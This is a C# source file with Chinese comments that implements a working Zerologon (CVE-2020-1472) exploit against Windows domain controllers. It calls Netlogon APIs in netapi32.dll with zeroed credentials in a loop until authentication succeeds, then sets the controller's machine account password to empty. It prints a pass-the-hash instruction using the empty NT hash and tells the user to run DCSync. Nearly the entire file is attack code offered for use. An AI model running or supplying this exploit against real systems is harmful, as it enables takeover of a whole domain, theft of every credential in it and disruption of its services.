using System;
using System.Runtime.InteropServices; // 结构体内存结构需要

// 定义zerlogin类
namespace zerologon
{
    class winapi32
    {
        // 定义枚举类型
        public enum NETLOGON_SECURE_CHANNEL_TYPE : int
        {
            NullSecureChannel = 0,
            MsvApSecureChannel = 1,
            WorkstationSecureChannel = 2,
            TrustedDnsDomainSecureChannel = 3,
            TrustedDomainSecureChannel = 4,
            UasServerSecureChannel = 5,
            ServerSecureChannel = 6,
            CdcServerSecureChannel = 7,
        }
        // 定义所需要的结构体
        [StructLayout(LayoutKind.Explicit,Size = 516)]
        public struct NL_TRUST_PASSWORD
        {
            [FieldOffset(0)]
            public ushort Buffer;

            [FieldOffset(512)]
            public uint Length;
        }
        [StructLayout(LayoutKind.Explicit, Size = 12)]
        public struct NETLOGON_AUTHENTICATOR
        {
            [FieldOffset(0)]
            public NETLOGON_CREDENTIAL Credential;

            [FieldOffset(8)]
            public uint Timestamp;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct NETLOGON_CREDENTIAL
        {
            public sbyte data;
        }

        // 引入dll的函数
        [DllImport("netapi32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        public static extern int I_NetServerReqChallenge(
            string PrimaryName,
            string ComputerName,
            ref NETLOGON_CREDENTIAL ClientChallenge,
            ref NETLOGON_CREDENTIAL ServerChallenge
            );
        [DllImport("netapi32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        public static extern int I_NetServerAuthenticate2(
           string PrimaryName,
           string AccountName,
           NETLOGON_SECURE_CHANNEL_TYPE AccountType,
           string ComputerName,
           ref NETLOGON_CREDENTIAL ClientCredential,
           ref NETLOGON_CREDENTIAL ServerCredential,
           ref ulong NegotiateFlags
           );

        [DllImport("netapi32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        public static extern int I_NetServerPasswordSet2(
            string PrimaryName,
            string AccountName,
            NETLOGON_SECURE_CHANNEL_TYPE AccountType,
            string ComputerName,
            ref NETLOGON_AUTHENTICATOR Authenticator,
            out NETLOGON_AUTHENTICATOR ReturnAuthenticator,
            ref NL_TRUST_PASSWORD ClearNewPassword
            );
    }
    class zerlogin
    {
        // 定义主函数
        public static void Main(string[] args)
        {
            if (args.Length < 3)
            {
                Console.WriteLine("Usage: zerlogin.exe <FQDN> <NETBIOS_NAME> <ACCOUNT_NAME>");
                Console.WriteLine("Example: zerlogin.exe DC.corp.acme.com DC DC$");
                return;
            }
            string DCFQDN = args[0];
            string DCNetBios = args[1];
            string DCAccount = args[2];
            Console.WriteLine("[+] Set Domain Controller FQDN: {0}", DCFQDN);
            Console.WriteLine("[+] Set Domain Controller NetBios Name: {0}", DCNetBios);
            Console.WriteLine("[+] Set Domain Controller Account: {0}", DCAccount);

            // 设置两个空值
            winapi32.NETLOGON_CREDENTIAL ClientChallenge = new winapi32.NETLOGON_CREDENTIAL();
            winapi32.NETLOGON_CREDENTIAL ServerChallenge = new winapi32.NETLOGON_CREDENTIAL();

            ulong NegotiateFlags = 0x212fffff;
            winapi32.NETLOGON_AUTHENTICATOR Auth = new winapi32.NETLOGON_AUTHENTICATOR();
            winapi32.NETLOGON_AUTHENTICATOR AuthReset = new winapi32.NETLOGON_AUTHENTICATOR();
            winapi32.NL_TRUST_PASSWORD NewPassword = new winapi32.NL_TRUST_PASSWORD();
            Console.WriteLine("[+] Try to exploit Doamin Controller ....");
            for (int i = 0; i < 2000; i++)
            {
                // 采用API来请求
                // 这里记录一下ref用法，ref就是引用参数,说白了跟指针其实是一样的
                winapi32.I_NetServerReqChallenge(DCFQDN, DCNetBios, ref ClientChallenge, ref ServerChallenge);
                if (winapi32.I_NetServerAuthenticate2(DCFQDN, DCAccount, winapi32.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel, DCNetBios, ref ClientChallenge, ref ServerChallenge, ref NegotiateFlags) == 0)
                {
                    if (winapi32.I_NetServerPasswordSet2(DCFQDN, DCAccount, winapi32.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel, DCNetBios, ref Auth, out AuthReset, ref NewPassword) == 0)
                    {
                        Console.WriteLine("[+] Success! Use pth .\\{0} 31d6cfe0d16ae931b73c59d7e0c089c0 and run dcscync", DCAccount);
                        return;
                    }
                    else
                    {
                        Console.WriteLine("[-] Can't to set machine account pass for {0}", DCAccount);
                        return;
                    }
                }
            }
            Console.WriteLine("[-] target may be not zerlogin (CVE-2020-1472) vulnerable");
        }
    }
}
